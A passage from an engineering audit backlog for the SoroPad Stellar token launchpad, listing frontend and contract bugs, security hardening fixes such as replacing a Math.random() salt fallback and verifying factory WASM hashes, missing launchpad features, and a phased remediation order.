  const fracStr = frac.toString().padStart(decimals, "0").replace(/0+$/, "");
  return `${whole}.${fracStr}`;
}
```

JavaScript's `%` keeps the sign of the dividend, so `raw = -1n` at 7 decimals gives `frac = -1n`, and `(-1n).toString().padStart(7, "0")` is `"00000-1"` — the output is `0.00000-1`. The `decimals === 0` branch is fine because it short-circuits, which is why a 0-decimal token never shows the bug.

Token balances should never be negative, but this function is also used to render **deltas** in the activity feed, the vesting progress bar (`VestingProgress.tsx:186` computes `vested - released`, which goes negative if a schedule is revoked mid-claim), and the supply-breakdown chart's segment sizes. Those are exactly the values that can be negative, and they are exactly the values a `replace(/0+$/, "")` will mangle.

**Fix:** Take the magnitude, format, and re-apply the sign:

```ts
const negative = raw < 0n;
const magnitude = negative ? -raw : raw;
// …existing logic on `magnitude`…
return negative ? `-${formatted}` : formatted;
```

Add a round-trip test: `fromBaseUnits(toBaseUnits("-1.5", 7), 7) === "-1.5"`, plus the same at 0, 7 and 18 decimals.

---

### 192. The deploy salt falls back to `Math.random()`

🟡 **Medium** · `frontend` `deploy` `security`

**Files:** `frontend/app/hooks/useDeployToken.ts` lines 10–21, 277

**Issue:** The salt determines the token's address:

```ts
const salt = randomBytes(32);
```

and the generator has a non-cryptographic fallback:

```ts
function randomBytes(length: number): Buffer {
  const array = new Uint8Array(length);
  if (typeof window !== "undefined" && window.crypto) {
    window.crypto.getRandomValues(array);
  } else {
    // Fallback for Node.js environment (shouldn't happen in client component)
    for (let i = 0; i < length; i++) {
      array[i] = Math.floor(Math.random() * 256);
    }
  }
  return Buffer.from(array);
}
```

`Math.random()` is a V8-internal generator whose output is observable from a single sample, and it is not seeded per call. A predictable salt lets anyone precompute the token address before the deploy lands, watch for it, and be first to interact with it — which for a token with `authorization_required` or a `max_balance_per_account` cap is a front-running opportunity, and for any token is at minimum a way to reserve an address the issuer's own tooling might later treat as its own.

The comment says the branch "shouldn't happen", and it is unreachable in a modern browser over HTTPS. It is reachable over plain HTTP on a LAN, in an older embedded webview, and anywhere `crypto.getRandomValues` is absent. Code that must not fall back should throw instead of degrading.

**Fix:** Delete the branch and call `crypto.getRandomValues` directly, throwing if `globalThis.crypto` is absent — `crypto.randomUUID()` and `getRandomValues` are both available in every browser that can run the rest of this app, so a missing `crypto` means something is wrong that the user should be told about. Add a test that stubs `crypto` away and asserts the deploy path refuses rather than producing a salt.

---

### 193. `sendAndPoll` throws away a contract ID it already knows

🟡 **Medium** · `frontend` `deploy` `ux` `correctness`

**Files:** `frontend/app/hooks/useDeployToken.ts` lines 122–175, 311–318

**Issue:** The contract address is known before the signature is even requested, because it comes out of the simulation:

```ts
// line 312
const contractId = StellarSdk.Address.fromScVal(sim.result.retval).toString();
```

Then the broadcast polls for 60 seconds and, on timeout, throws away everything it learned:

```ts
// lines 171–174
throw {
  message: `Transaction polling timeout. Hash: ${txHash}. Check the transaction status manually on a Stellar explorer.`,
  type: "timeout",
} as DeployTokenError;
```

The `contractId` is in scope and is not in the error. The user is told to go look it up manually, on an explorer, by transaction hash, for a transaction that may well have succeeded — and the deterministic address means they did not need to look it up at all. `DeployForm` then routes to `/dashboard/[contractId]`, so without the ID there is nowhere to go.

`maxAttempts = 30` at `pollInterval = 2000` is 60 seconds. A mainnet transaction in a busy ledger can legitimately take longer, and the polling loop's `continue` on a `getTransaction` throw (line 157) silently burns attempts on transport errors.

**Fix:** Add `contractId` to `DeployTokenError` and set it on the timeout path, then have `DeployForm` route to the dashboard on a timeout rather than to an error state — a `simulateTransaction`-derived address is authoritative whether or not the transaction landed, and the dashboard will show a zero supply if it did not. Also raise the budget and distinguish "the RPC is unreachable" from "the transaction has not settled", which are different messages to the same user.

---

### 194. `getAccount` is unguarded on the deploy path

🟢 **Trivial** · `frontend` `deploy` `correctness` `ux`

**Files:** `frontend/app/hooks/useDeployToken.ts` line 279

**Issue:** The first network call in the deploy path has no error handling:

```ts
const account = await rpc.getAccount(ctx.publicKey);
```

`getAccount` rejects with a 404 for an account that does not exist on the network — which is the normal state of a freshly funded testnet address before its first transaction, and the normal state of any address the user has just created in a wallet. The rejection propagates out of `deployViaFactory`, out of `deployToken`, and into `DeployForm`'s `catch` at line 326, which does `console.error("Deployment error:", err)` and then presumably sets a generic failure state. The user sees a deploy failure for what is a missing first-transaction fee, and the message points at the deploy rather than at the account.

**Fix:** Wrap it and map the 404 to a typed `DeployTokenError` with `type: "validation"` and a message that says the account has no transactions on this network yet, which is what they need to fix. A `PreflightCheck` for "account exists and has a balance" before the deploy button enables would be better — the wizard already has a preflight pipeline (`useTransactionSimulator`) and a `FeeEstimation` component, so this fits the existing shape.

---

### 195. Deploy never checks the factory's on-chain WASM hash before asking the user to sign

🟡 **Medium** · `frontend` `deploy` `security` `correctness`

**Files:** `frontend/app/hooks/useDeployToken.ts` lines 275–316; `frontend/app/api/wasm-manifest/route.ts`; `contracts/wasm-manifest.json`; `frontend/components/ui/ContractVerificationBadge.tsx`

**Issue:** The manifest records the audited WASM hashes and the factory addresses, and there is an API route and a UI badge built to compare against them. The deploy path uses none of it. `deployViaFactory` goes straight to simulation and signature:

```ts
const contract = new StellarSdk.Contract(factoryAddress);
const salt = randomBytes(32);
const account = await rpc.getAccount(ctx.publicKey);
const tx = new TransactionBuilder(account, { fee: BASE_FEE, networkPassphrase: ctx.passphrase })
  .addOperation(contract.call("deploy_token", ...))
  .setTimeout(300).build();
const sim = await rpc.simulateTransaction(tx);
// … sign and send
```

There is no `getLedgerEntries` against the factory's `Executable` entry, no comparison to `contracts/wasm-manifest.json`, and no check that `factoryAddress` is the address the manifest names for this network. `ContractVerificationBadge` exists to answer "is this the audited code?" for a token someone else deployed; the one moment where the answer matters most — the moment a user authorises new code to exist — is the one moment the app does not ask.

The gap matters more now that #174's two-step `set_token_wasm_hash` exists to be watched: even with the event in place, nothing in this app surfaces a change.

**Fix:** Before the simulation, read the factory's on-chain code hash and compare it to the manifest entry for the active network. On mismatch, refuse and say why, with the two hashes shown. This is one `getLedgerEntries` call and it converts the deploy button from "trust the configured address" to "verify the address". Then surface the same comparison in `ContractVerificationBadge` on the token dashboard, so the check extends past deploy.

---

### 196. Deployments live in `localStorage`, so `/dashboard` is empty for everyone except the browser that deployed

🟡 **Medium** · `frontend` `product` `dashboard` `architecture`

**Files:** `frontend/lib/deployments.ts` (whole file, 62 lines); `frontend/app/dashboard/page.tsx` (147 lines); `frontend/app/my-account/PersonalDashboard.tsx`

**Issue:** The entire "your launches" surface is a browser key:

```ts
const STORAGE_KEY_PREFIX = "soropad:deployments:";
export function getTrackedDeployments(walletAddress: string): TrackedDeployment[] {
  const key = `${STORAGE_KEY_PREFIX}${walletAddress}`;
  const stored = localStorage.getItem(key);
  return JSON.parse(stored) as TrackedDeployment[];
}
```

So a token deployed from a laptop is invisible from the founder's phone, invisible after a browser cache clear, invisible to a teammate, and invisible to a support request. `/dashboard` renders an empty page with a deploy CTA for every first-time visitor, which reads as a broken product rather than as a local-first design choice. `TrackedDeployment` even carries a `vestingContractId` that no on-chain source can supply — the pairing is a localStorage artefact too, so the activity feed's dual-contract subscription (#163) only works on the originating browser.

The on-chain registry already exists: the factory's `get_deployments_paginated` (factory line 270) lists every address it created, and `deploy_token` takes the `deployer` as its first argument, so per-wallet attribution is derivable. Nothing reads it.

**Fix:** Make the factory the source of truth. Read `get_deployments_paginated`, hydrate each contract, and match the `deployer` argument from the `init` event to the connected address. Keep `localStorage` only for local UI state (pinned, dismissed, last-visited) and never as the record of what exists. That also fixes #160's storage problem for free, and it is the same change #199 needs, so do them together.

---

### 197. `.gitignore` lost a newline and a build artifact is committed

🟢 **Trivial** · `repo` `quality` `tooling`

**Files:** `.gitignore` line 6; `frontend/tsconfig.audit.tsbuildinfo` (tracked); `contracts/airdrop/test_snapshots/` (ignored) versus the other three snapshot trees (not ignored)

**Issue:** Line 6 reads:

```
*.stackdump*.tsbuildinfo
```

Two patterns ran together, so `*.stackdump` and `*.tsbuildinfo` became one glob matching neither in practice. `frontend/tsconfig.audit.tsbuildinfo` is in `git ls-files` — it is committed, and it is a build artifact that changes on every type-check.

The same block is inconsistent about the snapshot directories. `contracts/airdrop/test_snapshots/` is ignored, and the token (145 + 512 files), vesting (100) and factory (10) trees are not. Those 767 snapshot files are generated by `stellar contract test` and regenerated wholesale by `test: regenerate snapshots for soroban-sdk 27` (commit `79370fd6`), so they are simultaneously tracked build output and the mechanism by which a behaviour change is reviewed. Both can be true, but the choice should be deliberate and stated, not an accident of which contract was written last.

**Fix:** Split line 6 into two lines, `git rm --cached frontend/tsconfig.audit.tsbuildinfo`, and add `*.tsbuildinfo`. Then decide the snapshot policy in `CONTRIBUTING.md`: either ignore all four trees and require `--include-ignored` in review, or track all four and document that a snapshot diff is the review artefact for any contract behaviour change. Whichever it is, make `.gitignore` and `CONTRIBUTING.md` say the same thing.

---

## Part 6: Product surface a launchpad is expected to have

The next eight issues are the comparison against [pons](https://www.ponsfamily.com/launchpad), a Robinhood Chain launchpad, and against what `PRD.md` §4 deferred. They are all **🔴 High** and none is a bug — they are absences. The regex sweep for `amm|bonding.?curve|liquidity.?pool|swap|slippage|price|marketplace|order.?book` across every `.ts`, `.tsx`, `.rs`, `.js`, `.mjs` and `.md` file returns 20 hits, all of them false positives (CSS `display: "swap"`, prose, and a test comment). The absence is total and deliberate.

### 198. No Explore page — there is no way to discover a launch

🔴 **High** · `frontend` `product` `architecture`

**Files:** `frontend/app/dashboard/page.tsx`; `frontend/app/components/RecentLaunches.tsx`; `frontend/app/components/Sidebar.tsx` lines 50–80; `frontend/lib/recentTokens.ts`

**Issue:** The navigation has four groups — issue (deploy, dashboard), distribute (claim, airdrop, allowances), account (my-account). None of them is discovery. `dashboard/page.tsx` reads `localStorage` (#196), `RecentLaunches` is a fixed twelve with a broken event filter (#179, #186), and there is no sort, no filter, and no page.

pons's `/launchpad` offers: recent buys, newest, oldest, market cap, and volume over 24h/7d/all-time. Four of those five are implementable today with no market data at all — newest and oldest are the factory's `get_deployments_paginated` ordered by ledger, and the deployment's `init` event carries the deployer. Only "recent buys" and the volume windows need #199.

**Fix:** Add `/explore` backed by the factory registry, with newest/oldest/most-recently-active as the initial sort keys, a search box over symbol and name, and per-row supply, holder count and last-activity. Render it server-side from cached registry data so the page is useful without a wallet. This is the highest-leverage single page in the product and it needs no contract work.

---

### 199. No price, no pool, no liquidity — a launch is unbuyable

🔴 **High** · `contracts` `product` `architecture`

**Files:** absent; `PRD.md` line 44 records the decision

**Issue:** A token deployed through SoroPad has no market. There is no pool, no AMM, no bonding curve, no swap, no slippage, no price, and no quote. The only way to acquire one is to find a holder willing to sell, which means the launchpad's output is not tradeable through the launchpad. `PRD.md` §4 puts "DEX / swap integration" out of scope for v1.0, which was a defensible call for a token *deployer*; it stops being defensible the moment the product is described as a launchpad, which is what the README does on line 3.

pons's answer is a constant-product pool funded in the same transaction as the token, locked, with buys and sells against it. On Stellar the equivalent primitives exist: the Stellar Aquarium AMM contract, or a bespoke pool. Either way the launch transaction goes from "deploy a contract" to "deploy a contract and seed a pool", which is a `TokenConfig` change plus one more invocation in the factory.

**Fix:** Two options, and the decision belongs to the project, not to a contributor:

1. **Seed a pool at deploy** — add `pool_seed: Option<i128>` to `TokenConfig` and have `deploy_token` deploy-and-fund the pool in the same transaction, so a launch is tradeable the moment it exists. This is what pons does and it is the coherent product.
2. **Do not, and say so** — keep SoroPad a deployer, remove "launchpad" from the product copy, and point users at a DEX for trading. This is honest and it is a legitimate product.

What is not legitimate is the current state, where the README says "launchpad", the PRD says the market is out of scope, and no page on the site mentions either. Whichever way it goes, `README.md` and the landing page need to state the boundary — that is #208's territory.

---

### 200. No creator fee and no protocol revenue

🔴 **High** · `contracts` `token` `product`

**Files:** absent; `contracts/token/src/lib.rs` has no fee logic and no `fee`-suffixed storage key

**Issue:** Every transfer is fee-free, which is correct for an SEP-41 token and means the protocol earns nothing from the tokens it deploys. There is no `fee_bps`, no `fee_recipient`, no `fee_exempt` set, no treasury, and no way for a creator to take a cut of volume. The `DataKey` enum has nineteen variants and none of them is about money moving beyond the principal.

The absence has a second-order effect that is easy to miss: with no fee mechanism, there is no reason for anyone to run a SoroPad token on a SoroPad-branded venue, because the economics are identical to deploying the contract by hand. The deploy wizard is a convenience wrapper around a single `stellar contract deploy` and a factory call.

**Fix:** Add a SEP-41-compatible transfer fee — a `fee_bps: u32` capped at a documented maximum, a `fee_recipient: Address`, and an `is_fee_exempt(Address)` set — with the fee taken in `_transfer_internal` and a `fee_collected` event so it is auditable. Emit it in `initialize`, let `set_fee_bps` be admin-only and capped, and add `renounce_fee` as a one-way so a token can permanently return to fee-free. Do not gate transfer on it and do not let it apply to `burn`. This is a contract change, so it needs a migration story for the existing testnet tokens, and the fee cap is a regulatory question worth a doc rather than a constant in the code.

---

### 201. No launch protection — a new token is snipeable by construction

🔴 **High** · `contracts` `token` `product` `security`

**Files:** absent

**Issue:** The moment `initialize` returns, the token is tradeable by anyone who sees the transaction. There is no first-block window, no per-wallet cap on the opening purchase, no cooldown, no allowlist for the first N ledgers. pons applies a two-block anti-snipe window capping each wallet at 5% of supply and 5.5% of any single buy, which is a blunt instrument but it addresses a specific failure: a bot watching the mempool for `deploy_token` calls and buying the maximum available in the same block the token exists.

SoroPad already has the primitive this needs — `max_balance_per_account` (line 1019) and `authorization_required` (line 621) both exist and both are deploy-time or admin-set. What is missing is a *time-bounded* version: a policy that is active for the first N ledgers after `initialize` and then decays away, so the issuer does not have to remember to turn it off.

**Fix:** Add `launch_protection: Option<LaunchProtection>` to `initialize`, carrying a `window_ledgers` and a `max_wallet_pct`, enforced in `_transfer_internal` while `env.ledger().sequence() < init_ledger + window_ledgers`, and automatically inactive afterwards. Emit a `protection_end` event at the boundary so an indexer knows when the window closed. Reuse the existing `_enforce_max_balance_per_account` arithmetic and the existing `ExceedsMaxBalance` error rather than adding a parallel mechanism. Then surface the window on the public token page — a launch that says "5% max per wallet for the first hour" is a launch people will wait for.

---

### 202. No graduation mechanic

🟡 **Medium** · `contracts` `product` `architecture`

**Files:** absent

**Issue:** pons runs launches against a fixed liquidity target (4.2 ETH) and renders a progress line showing how close each token is to it, with the trading pool funded from the start. The mechanism is a bonding curve plus a graduation threshold, and it solves a real problem: it gives a launch a visible, objective, public definition of "this worked" that does not depend on the creator's opinion or on a discretionary listing decision.

SoroPad has nothing of the kind. A launch is either alive or it is not, and there is no on-chain signal. That matters for two audiences at once: a holder with no way to tell whether a launch is gaining traction, and a third-party indexer with no way to build a leaderboard without inventing its own criteria.

**Fix:** The cheap version does not need a curve. Add a `launch_seal(commitment)` function to the token contract that an issuer calls when the token reaches whatever threshold they consider success, recording the ledger and the supply at that moment, plus a `sealed: bool` getter and a `seal` event. The dashboard and a future `/explore` sort on it. This gives the indexable, objective, creator-attested signal that #198's leaderboard needs, in one function and one storage key, without committing the project to an AMM. Build the real curve in #199 if and when that decision is made.

---

### 203. No MiCA, privacy, terms, or risk disclosures

🟡 **Medium** · `repo` `docs` `product` `security`

**Files:** absent; contrast `README.md` lines 93–94, which is the whole legal section ("📄 License — MIT")

**Issue:** pons publishes a MiCA whitepaper, a privacy policy, terms of use, and a prominent risk notice on every page: "Transactions are submitted through your wallet and may be irreversible. Tokens can be volatile or lose all value. pons does not provide custody, warranties, or financial advice." SoroPad publishes a licence and nothing else. For a project whose stated users are "founders, DAOs, and developers" launching tokens to the public on a public network, that is the single most load-bearing missing document: an EU-facing token launchpad without a MiCA assessment is a compliance exposure on the operator, and a token launchpad with no risk notice is a consumer-protection exposure on every page.

The technical pieces that make a real disclosure possible already exist and are documented: `docs/compliance-node-interface.md` describes the on-chain compliance hook, `docs/contract-upgrade.md` describes who can change the code, and `docs/vesting-solvency.md` describes the solvency model. What is missing is the document that says what all of that means for someone about to click deploy, written for them rather than for an integrator.

**Fix:** Add `RISK.md`, `PRIVACY.md` and `TERMS.md` at the repository root, and surface the risk notice in the UI footer and on the deploy review step — `StepReview.tsx` is the last screen before the signature and currently has no disclosure of any kind. The MiCA assessment itself is legal work, not engineering work; the engineering deliverable is the risk notice and the accurate description of who can do what to a token after launch, both of which can be written from the existing docs. Add a `SECURITY.md` at the same time (see #207).

---

### 204. No on-chain metadata registry, so tokens are anonymous to third parties

🔴 **High** · `contracts` `deploy` `product` `architecture`

**Files:** absent; the destination exists at `contracts/token/src/lib.rs` lines 651–657 (`update_contract_uri`) and the data does not at `frontend/app/deploy/steps/StepMetadata.tsx`

**Issue:** #160 is the local symptom; this is the structural one. A SoroPad token's metadata lives nowhere. `name` and `symbol` are on-chain in instance storage; `description`, `logoUrl`, `website`, `twitter` and `discord` are collected by the UI and dropped. `contract_uri` is settable but unset. The result is that the only machine-readable record of a SoroPad launch is `factory.get_deployments_paginated` returning an address — no name, no symbol, no creator, no launch ledger, no supply at launch.

pons calls this "onchain-native integration" and is right that it is the property that matters: metadata, pricing and status readable directly from contracts and events, for indexers and third-party tools, with no dependency on the launchpad's API staying up. SoroPad's `/api/tokens/recent` is a single Next.js route handler on one deployment; if it goes down, discovery goes with it, and there is no on-chain substitute.

**Fix:** A `metadata registry` contract, keyed by token contract ID, holding a content-addressed metadata digest plus a small set of indexed fields (symbol, name digest, creator, launch ledger, initial supply) so a third party can enumerate and filter without fetching every document. The factory writes the entry in the same transaction as `deploy_token` — which means the metadata has to arrive as a parameter, so `TokenConfig` gains a `metadata: Option<Bytes>` field carrying the JSON, and the registry stores its keccak256 alongside the indexed fields. The JSON itself lives wherever the creator wants (IPFS by default); the registry commits to it. This is the fix that makes #160 correct rather than merely non-lossy, and it should be designed before #199, because a pool-seeded launch wants its metadata on-chain too.

---

### 205. No indexer-facing event contract, and bindings for only half the contracts

🟡 **Medium** · `contracts` `docs` `tooling` `architecture`

**Files:** `docs/events.md` (generated, CI-checked); `docs/events.json` (219 lines); `frontend/lib/bindings/{token,vesting}/` — no `factory` or `airdrop` directories

**Issue:** The event surface is the product's public integration API, and it is documented for two of four contracts. `scripts/generate_events_doc.py` parses the `.publish(...)` sites and `docs/events.md` is regenerated in CI, which is genuinely good — for `token` and `vesting`. The airdrop's 8 events and the factory's are not covered, and there is no way for the generator to know they should be: it reads `.publish(` sites, and those two contracts were written with the same idiom, so the gap is in the checked-in fixture (`docs/events.json`) rather than the parser.

The consequence is that the two contracts a third party most wants to index — the factory (to find launches) and the airdrop (to follow a distribution) — have no published topic schema, no payload column list, and no TypeScript bindings. `frontend/lib/bindings/` has `token` and `vesting` and nothing else, and the deploy path hand-rolls the factory invocation because "the factory WASM embeds the token spec, which trips up the TS binding generator" (comment at `useDeployToken.ts:266`) — so even the one contract the product depends on most has no generated client, and its `ScVal` encoding is written by hand at the single call site that matters.

**Fix:** Add `airdrop` and `factory` to `docs/events.json` and to the bindings generator, and fix the factory's binding generation (it likely needs `TokenConfig` declared to the generator rather than skipped) so `deploy_token` stops being hand-encoded. Then add a CI step that fails when a contract under `contracts/` has no entry in `docs/events.json` — the same class of guard as #185's error-map generator, and the reason both gaps exist is that nothing enumerates the contracts and checks the per-contract artefacts are present.

---

## Part 7: Inventions

These are not ports of pons. They are the things this codebase is unusually well placed to build, because the parts that make them hard — a real factory, a real vesting contract with cliff and linear unlock, typed error enums, a generated event schema, a CI that verifies WASM hashes — already exist.

### 206. A fee switch the token cannot turn off

🔴 **High** · `contracts` `token` `product` `architecture`

**Issue:** #200 adds a transfer fee. A creator-fee that the creator can change is worth very little: it can be raised to 100% on a token people are already holding, and a holder who cannot verify the ceiling has no protection at all. The useful version is a **fixed** fee, chosen at deploy, immutable afterwards. Not "the creator may not raise it" — the creator may not change it at all, and the value is written into the contract at `initialize` and never written again.

That is a genuinely different product from a mutable fee, and it is the version that would let a launchpad market "your token's fee is 1% forever" and mean it. It also composes with #211: an immutable fee is only trustworthy if the code is immutable too, and the token contract can enforce that relationship itself rather than asking the user to trust two independent admin actions.

**Implementation sketch:** `initialize(..., fee_bps: u32, fee_recipient: Address)` with `fee_bps <= MAX_FEE_BPS`; a `DataKey::FeeBps` written once and never `set`; `_transfer_internal` takes the fee, credits `fee_recipient` and emits `fee_collected(from, to, amount, fee)`. Add an assertion-style test that no `pub fn` writes `FeeBps`, which is greppable and therefore enforceable in CI — a genuinely novel guard for a Soroban contract, and the pattern generalises to any "set at deploy, never again" parameter (`decimals`, `MaxSupply` semantics, the #201 protection window).

---

### 207. Continuous vesting with an off-chain claim signature

🔴 **High** · `contracts` `vesting` `product`

**Issue:** Vesting today is cliff-plus-linear, and claiming costs a transaction per claim. That is fine for quarterly grants and bad for a stream: a recipient who wants $100 a day pays 365 transactions a year, and the contract's own `keep_alive` (line 436) exists only because entries expire. A pull-payment stream solves both — the recipient signs a claim authorisation off-chain, a relayer submits it, and the stream accrues continuously with no per-claim transaction for the recipient.

The obstacle is that Soroban has no `ecrecover`, so the contract cannot verify an arbitrary signature. The standard workaround is a per-recipient signing key, or a Soroban-auth `AuthorizedInvocation` with a `require_auth_for_args` scope — both of which mean the recipient needs a Stellar account, which they already have. `soroban_sdk::auth::AuthorizedInvocation` plus a scoped `SorobanAuthorizationEntry` would let a recipient pre-authorise a bounded claim range once, and the contract enforces the scope. The interesting part is that it also solves #168: a stream's accrual can be read without a transaction, so a paused or frozen token does not have to stop the accounting, only the withdrawal.

**Implementation sketch:** `stream_grant(recipient, total, start_ledger, end_ledger, max_per_claim)` writing a `Stream` schedule; `claim_stream(recipient, auth: AuthorizedInvocation)` verifying the authorisation covers `(recipient, from_ledger, to_ledger)` and paying `accrued(to_ledger) - released`; a `stream_accrued(recipient)` view that is pure arithmetic and never touches the token. The `max_per_claim` bound is what keeps a single authorised invocation from draining the contract. This is the feature that would make SoroPad's vesting genuinely better than a spreadsheet, and it is the one place where the launchpad's existing `solvency()` accounting (#168, `docs/vesting-solvency.md`) becomes load-bearing rather than advisory.

---

### 208. Deploy-as-a-service with mandatory WASM attestation

🔴 **High** · `frontend` `deploy` `security` `architecture`

**Issue:** #195 verifies the factory's code hash at deploy, and `docs/contract-upgrade.md` exists, and `ContractVerificationBadge` exists. None of it composes into a guarantee a user can be *shown*. The composition is the product: a deploy flow that, before asking for a signature, displays four facts — the factory's on-chain code hash and whether it matches the audited manifest, the token WASM the factory will instantiate, the exact `TokenConfig` that will be passed, and the resulting deterministic address — and refuses to proceed on any mismatch.

The reason this is more than a nice dialog is that it inverts the trust relationship. Today a user trusts the launchpad to deploy the right code; with the attestation, the launchpad hands the user everything needed to verify independently, and the user's signature is the authorisation, not the trust. That is the difference between a custodial-feeling flow and a non-custodial one, and it is exactly the property pons's "your wallet submits every transaction, pons does not custody assets" line is asserting.

**Implementation sketch:** a `resolveLaunchAttestation(network, factoryAddress, tokenConfig)` that returns `{factoryHash, tokenWasmHash, manifestMatch, address, warnings[]}`, rendered by a new `LaunchAttestation` component in `StepReview.tsx` and signed into the result of `deployToken`. Fail closed on a manifest miss. Then extend it to the token dashboard: a user about to interact with *someone else's* SoroPad token should get the same four facts, which is what `ContractVerificationBadge` was built for and never wired to.

---

### 209. Sponsored deploys: the launchpad pays the fee

🟡 **Medium** · `contracts` `deploy` `product`

**Issue:** Deploying on Stellar requires a funded account, and a funded account is the single largest drop-off between "I want to issue a token" and "I have issued a token". A new user needs XLM before they can do anything, and SoroPad's own preflight already checks for it. Fee sponsorship inverts that: the launchpad sponsors the first deploy, the user pays nothing, and the token is theirs the moment it exists.

This is unusually clean on Stellar specifically, because fee-bump transactions and Soroban auth both support it natively — a sponsor constructs the transaction with a custom fee-bump source, and the resource fees come from the sponsor's account while the `require_auth` still comes from the user's. The interesting design question is the abuse ceiling, and the answer is a per-address quota held off-chain and enforced by the sponsoring endpoint, because an on-chain quota would itself cost a transaction to check.

**Implementation sketch:** a `POST /api/sponsor` that builds a fee-bump transaction over the user's already-signed Soroban invocation, enforces a per-address and per-IP daily quota, and returns the sponsored XDR. Combine with #208: the user signs the invocation, the sponsor only pays the fee, and the user never hands over their account. This is also the natural home for the "gasless first claim" that a token's first hundred holders need, which no launchpad in this space currently offers.

---

### 210. On-chain reputation for creators and contracts

🟡 **Medium** · `contracts` `product` `architecture`

**Issue:** Every launchpad has the same unsolved problem: nothing distinguishes a careful issuer from a rug. The available signals are all off-chain and all optional — a Twitter handle, a website, a Discord invite — and they are exactly the signals a deployer fabricates. The signals that are not optional are on-chain: did the admin renounce control, is the fee fixed, is the code hash the audited one, did the contract get paused, was it ever upgraded, how many distinct holders are there, how long did the treasury last.

All of those are derivable from events this project already indexes and documents. The invention is to make the derivation a first-class, verifiable artefact rather than a dashboard widget: a `reputation` contract, or a documented derivation over `docs/events.md`, that publishes a per-token attestation — an ordered list of the facts above, each with the event id that proves it, and a hash a third party can recompute. A creator cannot improve the score without doing the things the score measures, and cannot fake it without forging an event on a contract nobody can forge events on.

The reason it belongs here rather than in a generic "trust score" product is that the inputs are unusually clean: a fixed fee (#206), an immutable code hash (#208), an explicit renounce (#156's fix and the existing `revoke_admin`), and a `solvency()` getter that a vesting contract publishes. Four of the five facts are already either implemented or specified in this wave. The fifth — holder concentration — needs a holder index, which is the last piece of infrastructure in Part 6 that does not exist.

---

## Summary

| Area | Issues | Notes |
| --- | --- | --- |
| Live failures | 156–163 | A compliance node plus `revoke_admin` bricks a token permanently; two policy TTLs were missed; `mint_batch` still carries a 6-day TTL; the deploy wizard drops all five metadata fields; the indexer cursor and the event poller both lose data. |
| Contract policy and lifecycle | 164–174 | The batch vesting path skips the past-cliff check; `prune_recipient` can orphan a live grant; a token pause freezes every release; the airdrop still carries the SDK's test-harness TTL constant. |
| Unbounded work and duplication | 175–178 | Four vesting getters loop uncapped; `transfer_from`/`burn_from` are 40 duplicated lines; `burn`/`burn_self` are identical. |
| Indexer and event pipeline | 179–186 | "Recent launches" matches every contract on the network; the Mercury credential is a `NEXT_PUBLIC_` variable; an 83-minute window is presented as full history; two error maps are short. |
| Frontend correctness | 187–197 | `VestingDashboard` renders twice; validation is format-only; `toBaseUnits` throws uncaught; `contract_uri` is a raw `href`; the salt can fall back to `Math.random()`. |
| Missing product surface | 198–205 | No explore page, no market, no fees, no launch protection, no graduation, no on-chain metadata, no indexer contract, no legal disclosures. |
| Inventions | 206–210 | An immutable fee, streaming vesting with scoped authorisation, deploy-time attestation, sponsored deploys, on-chain reputation. |

**Recommended order**

Seven phases, ordered so that anything which can lose funds, freeze a token, or silently drop a user's input is dealt with before anything that adds a page.

1. **Phase 1: #156, #157, #158, #159, #160.** The permanent-brick path and the two lapsing policy keys first — these are the four that lose money or lose compliance. #160 is in this phase because the data loss is already complete and every day it stays is another founder's description gone.
2. **Phase 2: #161, #162, #163.** The event pipeline. #161 and #162 both drop events permanently and both are cheap to test with a mocked RPC. Land them together: both touch the cursor logic.
3. **Phase 3: #171, #172, #168, #166, #167.** The contract-policy cluster. #171 is a two-line deletion with a doc correction. #168 and #172 are the two "funds are stuck and there is no way out" cases, which is the same severity as #156 and should be argued about as one group.
4. **Phase 4: #179, #180, #183, #188, #196.** Make the data honest. Four of the five are "the app shows something as complete that is not", which is the same class of defect and cheaper to fix than the contract work.
5. **Phase 5: #187, #189, #190, #191, #192, #193, #194, #195.** The frontend corrections. Small, independent, and each one is a two-hour change with a test.
6. **Phase 6: #198, #199, #200, #201, #202, #204, #203, #205.** The product surface, in dependency order: #204 (on-chain metadata) before #199 (market) before #198 (explore), because a launch with a pool and no metadata is still anonymous. #203 is independent and can run whenever someone will write it.
7. **Phase 7: #206, #208, #209, #207, #210.** The inventions. #206 and #208 are the ones that change what the product *is*; the rest follow from them.

<!-- wave-order
phase-1-funds-and-policy:      156, 157, 158, 159, 160
phase-2-event-pipeline:        161, 162, 163
phase-3-contract-policy:       171, 172, 168, 166, 167
phase-4-truthful-data:         179, 180, 183, 188, 196
phase-5-frontend-fixes:        187, 189, 190, 191, 192, 193, 194, 195
phase-6-product-surface:       204, 199, 200, 201, 202, 198, 203, 205
phase-7-inventions:            206, 208, 209, 207, 210
-->

**A note on the `wave-order` block.** `scripts/create_wave_issues.py` does not currently implement the `--order` flag that wave 9's closing note refers to — it parses sections in document order. The block above is the intended creation order, and either the flag should be added (it is a twenty-line change: read the block, reorder the parsed sections) or the file should be reordered by hand before the first run. Right now the two documents disagree about what the script does.

**A note on the pons comparison.** pons is on Robinhood Chain, which has EVM semantics: a constant-product pool is a few hundred lines of Solidity, signing is `ecrecover`, and metadata is an NFT. None of those primitives transfer to Soroban, so none of Parts 6 and 7 is a port — the value of the comparison is the *list of what a launchpad is expected to have*, not the code. Three items transfer nearly unchanged because they are not chain-specific: #198 (explore, from the factory registry), #203 (disclosures), and #208 (attestation at deploy). The rest need design work before they are tickets, which is why they are filed at the level of the problem rather than the implementation.

**A note on verification.** The `max_entry_ttl` figure in #156, #159, #171 and #172 is 3,110,400 on both testnet and mainnet, read from the `CONFIG_SETTING_STATE_ARCHIVAL` ledger entry (`getLedgerEntries` with key `AAAACAAAAAo=`) on 2026-07-30 per wave 9's verification note. Network settings change by validator vote, so re-check before acting. The 6,312,000 value that appears in `contracts/airdrop/src/lib.rs:16` is the `soroban-sdk` test-environment default (`soroban-sdk/src/env.rs:514`) and is not a network parameter; #171's first step is to delete it, not to correct it.

